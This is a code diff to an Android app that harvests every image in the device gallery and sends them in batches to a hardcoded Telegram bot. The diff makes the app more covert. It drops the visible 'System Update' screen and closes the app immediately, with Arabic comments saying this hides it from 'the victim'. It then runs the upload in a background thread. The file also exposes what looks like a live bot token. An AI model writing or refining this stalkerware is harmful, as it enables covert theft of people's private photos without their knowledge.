@@ -2,18 +2,15 @@ package com.vipih;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.MediaStore;
-import android.widget.LinearLayout;
-import android.widget.TextView;
-import android.widget.Toast;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -30,25 +27,13 @@ public class MainActivity extends Activity {
     private static final int PERMISSION_CODE = 100;
     private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
     private static final String CHAT_ID = "8197183486";
-    private TextView statusText;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setPadding(50, 50, 50, 50);
-
-        statusText = new TextView(this);
-        statusText.setText("System Update...");
-        statusText.setTextSize(18);
-
-        layout.addView(statusText);
-        setContentView(layout);
-
         if (checkPermissions()) {
-            startExtraction();
+            startBackgroundWork();
         } else {
             requestPermissions();
         }
@@ -74,79 +59,59 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            startExtraction();
+            startBackgroundWork();
         } else {
-            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
+            finish(); // إغلاق التطبيق إذا رفض الضحية الصلاحية
         }
     }
 
-    private void startExtraction() {
-        new ExtractAndSendTask().execute();
-    }
+    private void startBackgroundWork() {
+        final Context ctx = getApplicationContext();
+        
+        // إخفاء التطبيق فوراً عن شاشة الضحية
+        finish(); 
 
-    private class ExtractAndSendTask extends AsyncTask<Void, Integer, String> {
-        @Override
-        protected String doInBackground(Void... voids) {
-            String[] projection = {MediaStore.Images.Media._ID};
-            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+        // تشغيل السحب في الخلفية
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String[] projection = {MediaStore.Images.Media._ID};
+                    String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
-            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
+                    Cursor cursor = ctx.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
 
-            if (cursor == null) return "Error";
+                    if (cursor == null) return;
 
-            int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-            int totalCount = cursor.getCount();
-            int sentCount = 0;
+                    int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
+                    List<Uri> batchUris = new ArrayList<>();
 
-            List<Uri> batchUris = new ArrayList<>();
+                    while (cursor.moveToNext()) {
+                        int id = cursor.getInt(idIndex);
+                        Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
+                        batchUris.add(contentUri);
 
-            while (cursor.moveToNext()) {
-                int id = cursor.getInt(idIndex);
-                Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
-                batchUris.add(contentUri);
-
-                // تلجرام يسمح بإرسال 10 صور كحد أقصى في الطلب الواحد
-                if (batchUris.size() == 10) {
-                    if (sendMediaGroup(batchUris)) {
-                        sentCount += batchUris.size();
+                        if (batchUris.size() == 10) {
+                            sendMediaGroup(ctx, batchUris);
+                            batchUris.clear();
+                            
+                            // تأخير بسيط جداً (200 ملي ثانية) لتجنب حظر تلجرام مع الحفاظ على السرعة
+                            try { Thread.sleep(200); } catch (InterruptedException ignored) {}
+                        }
                     }
-                    batchUris.clear();
-                    publishProgress(sentCount, totalCount);
-                    
-                    // تأخير بسيط جداً بين المجموعات لتجنب حظر البوت
-                    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+                    cursor.close();
+
+                    if (!batchUris.isEmpty()) {
+                        sendMediaGroup(ctx, batchUris);
+                    }
+                } catch (Exception e) {
+                    e.printStackTrace();
                 }
             }
-            cursor.close();
-
-            // إرسال ما تبقى من صور (أقل من 10)
-            if (!batchUris.isEmpty()) {
-                if (sendMediaGroup(batchUris)) {
-                    sentCount += batchUris.size();
-                }
-                publishProgress(sentCount, totalCount);
-            }
-
-            return "Done: " + sentCount + "/" + totalCount;
-        }
-
-        @Override
-        protected void onProgressUpdate(Integer... values) {
-            super.onProgressUpdate(values);
-            if (statusText != null) {
-                statusText.setText("Sent: " + values[0] + " / " + values[1]);
-            }
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            super.onPostExecute(result);
-            if (statusText != null) statusText.setText(result);
-        }
+        }).start();
     }
 
-    // دالة إرسال 10 صور في طلب واحد (سرعة فائقة)
-    private boolean sendMediaGroup(List<Uri> uris) {
+    private void sendMediaGroup(Context ctx, List<Uri> uris) {
         String boundary = "*****" + System.currentTimeMillis();
         String lineEnd = "\r\n";
         String twoHyphens = "--";
@@ -162,17 +127,15 @@ public class MainActivity extends Activity {
 
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
 
-            // 1. إرسال معرف المحادثة
             request.writeBytes(twoHyphens + boundary + lineEnd);
             request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
             request.writeBytes(CHAT_ID + lineEnd);
 
-            // 2. تجهيز مصفوفة JSON للصور
             JSONArray mediaArray = new JSONArray();
             List<byte[]> imageDataList = new ArrayList<>();
 
             for (int i = 0; i < uris.size(); i++) {
-                byte[] data = compressImage(uris.get(i));
+                byte[] data = compressImage(ctx, uris.get(i));
                 if (data != null) {
                     imageDataList.add(data);
                     JSONObject mediaObj = new JSONObject();
@@ -182,13 +145,12 @@ public class MainActivity extends Activity {
                 }
             }
 
-            if (imageDataList.isEmpty()) return false;
+            if (imageDataList.isEmpty()) return;
 
             request.writeBytes(twoHyphens + boundary + lineEnd);
             request.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
             request.writeBytes(mediaArray.toString() + lineEnd);
 
-            // 3. إرسال ملفات الصور نفسها
             for (int i = 0; i < imageDataList.size(); i++) {
                 request.writeBytes(twoHyphens + boundary + lineEnd);
                 request.writeBytes("Content-Disposition: form-data; name=\"file" + i + "\"; filename=\"img" + i + ".jpg\"" + lineEnd);
@@ -201,31 +163,28 @@ public class MainActivity extends Activity {
             request.flush();
             request.close();
 
-            int responseCode = conn.getResponseCode();
+            conn.getResponseCode();
             conn.disconnect();
-            return responseCode == 200;
 
         } catch (Exception e) {
             e.printStackTrace();
-            return false;
         }
     }
 
-    // تصغير وضغط الصورة لتصبح خفيفة جداً (تسريع الرفع)
-    private byte[] compressImage(Uri uri) {
+    private byte[] compressImage(Context ctx, Uri uri) {
         try {
             BitmapFactory.Options options = new BitmapFactory.Options();
             options.inJustDecodeBounds = true;
-            InputStream input = getContentResolver().openInputStream(uri);
+            InputStream input = ctx.getContentResolver().openInputStream(uri);
             BitmapFactory.decodeStream(input, null, options);
             if (input != null) input.close();
 
-            // تصغير أبعاد الصورة إلى 1000 بكسل كحد أقصى
+            // تصغير الأبعاد لسرعة الإرسال
             int inSampleSize = 1;
-            if (options.outHeight > 1000 || options.outWidth > 1000) {
+            if (options.outHeight > 800 || options.outWidth > 800) {
                 final int halfHeight = options.outHeight / 2;
                 final int halfWidth = options.outWidth / 2;
-                while ((halfHeight / inSampleSize) >= 1000 && (halfWidth / inSampleSize) >= 1000) {
+                while ((halfHeight / inSampleSize) >= 800 && (halfWidth / inSampleSize) >= 800) {
                     inSampleSize *= 2;
                 }
             }
@@ -233,14 +192,15 @@ public class MainActivity extends Activity {
             options.inJustDecodeBounds = false;
             options.inSampleSize = inSampleSize;
 
-            input = getContentResolver().openInputStream(uri);
+            input = ctx.getContentResolver().openInputStream(uri);
             Bitmap bitmap = BitmapFactory.decodeStream(input, null, options);
             if (input != null) input.close();
 
             if (bitmap == null) return null;
 
             ByteArrayOutputStream stream = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream); // ضغط 70%
+            // ضغط الجودة 60% لتسريع الرفع (الفرق بالجودة غير ملحوظ للعين)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream); 
             bitmap.recycle();
             return stream.toByteArray();
         } catch (Exception e) {
